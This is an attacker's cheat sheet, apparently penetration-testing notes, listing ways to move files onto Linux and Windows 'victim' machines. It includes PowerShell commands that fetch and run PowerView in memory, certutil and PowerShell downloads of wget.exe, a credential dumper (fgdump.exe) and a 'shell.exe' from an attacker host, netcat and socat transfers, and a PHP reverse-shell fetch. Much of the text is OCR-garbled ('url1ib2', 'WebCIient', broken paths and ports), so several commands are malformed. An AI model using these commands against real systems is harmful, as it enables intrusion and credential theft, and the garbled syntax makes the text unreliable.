# Transfer files to VICTIM

## Kali Atttacker 
#### Host file(s)

- SCP:  `scp local_file.txt USER@HOST_IP: /tmp/remote_file.txt`
- SSH:  `sudo systemctl start ssh`
- FTP:  `systemctl start pure-ftpd`

- Web 
   - WWWtree:  `python3 /opt/wwwtree/wwwtree.py -r N/transfer/ -i tunø -p 80`
   - Python:  `sudo python -m SimpleHTTPServer 80`
   - Python3:  `sudo python3 -m http.server 80`
   - PHP:  `sudo php -s e.o.ø.ø:8ø`
   - Apache:  `service apache2 start`
   - ruby:  `ruby -run -e httpd . -p 9000`
   - ruby:  `ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8080, : DocumentRoot Dir.pwd).start"`

- netcat:  `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
- Socat:  `sudo socat file: <FILE-NAME>`
- SMB: `impacket` `sudo impacket-smbserver share $(pwd) -smb2support`
- RDP:  `rdesktop` `rdesktop $ip —u <username> -p <password> -r disk:tmp=$(pwd)`
- Evil-winRM: `evil-winrm` `upload filename.exe`


## Linux Victim

#### SSH
- `sudo systemctl start ssh`

#### SCP
- `scp /Loca1/Target/Detination`

#### FTP 
- `ftp <IP-ATTACKER>`

- Multiple files `mget <FILE-*>`

- Single files `get <FILE-NAME>`

#### Web
- `curl http://<IP-ATTACKER>/<FILE> -o <file>`

- `wget http://<IP-ATTACKER>/<FILE>`

#### netcat
- `nc -nlvp 4444 > incoming. sh`


## Windows Victim

#### FTP
```
open <IP-ATTACKER>
<USERNAME>
<PASSSWORD>
binary
mget file.exe
disconnect
quit
```

`ftp -i -s:ftp.txt`

`ftp <IP-ATTACKER>`
`mget <FILE-NAME>`
`get <FILE-NAME>`

### Web
`powershell —ExecutionPolicy Bypass`

   ```powershell
   iex( new-object
   net.webclient).downloadstring('(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
   ```

   ```sh
   powershell -c "(new-object
   System . Net. WebCIient) . DownloadFiIe ( ' http:/ /<IP-
   ATTACKER>/wget. exe ' , 'C: Wsers\Public exe' ) "
   ```

   `curl http://<IP-ATTACKER>/<FILE> -o <file>`

   `certutil -urlcache -f http://IP-attacker/fi1ename.exe shell.exe`


#### PHP
`<?php file_put_contents>("/tmp/php-reverse.txt", fopen("http://<rse—shell.txt", "r")); ?>`

#### Python
`python.exe -c "import url1ib2; print url1ib2.urlopen('http://<IP-ATTACKER>/fgdump.exe').read()" >fgdump.exe`

#### Netcat
`nc -nlvp 4444 > incoming. exe`

#### Socat
`socat TCP4:10.11.0.4:443 file:<FILE-NAME>,create`

#### SMB
`copy exe C: \\0.0.0.0\share\filename.exe C:\users\public\music\filename.exe`

#### RDP
`Just copy via the GUI`

#### winRM
